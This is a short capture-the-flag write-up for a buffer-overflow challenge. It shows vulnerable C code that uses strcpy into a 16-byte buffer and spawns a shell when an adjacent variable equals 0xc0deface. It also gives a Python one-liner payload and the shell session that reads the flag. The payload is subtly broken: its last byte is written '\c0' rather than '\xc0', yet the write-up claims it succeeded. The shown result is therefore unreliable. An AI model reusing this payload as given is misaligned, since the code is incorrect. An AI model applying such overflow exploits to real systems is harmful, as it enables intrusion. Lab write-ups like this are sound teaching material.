# Overflow 1 - 50

```
This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? 
You can solve this problem interactively here, and the source can be found here.

```
The website gave us the source code and interactive shell. 

Lets take a look at the source first.

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}
```

Simple C code. Allocates 16 bytes of char and strcpy. And if secret == 0xc0deface, we get a shell!!!!!
As the ttle of the challenge suggests,we can write 16 bytes and the password to get the shell. 

My payload:

```
pico15664@shell:/home/overflow1$ ./overflow $(python -c "print 'A' * 16 + '\xce\xfa\xde\c0'")
$cat flag.txt
ooh_so_critical

Flag:ooh_so_critical
```






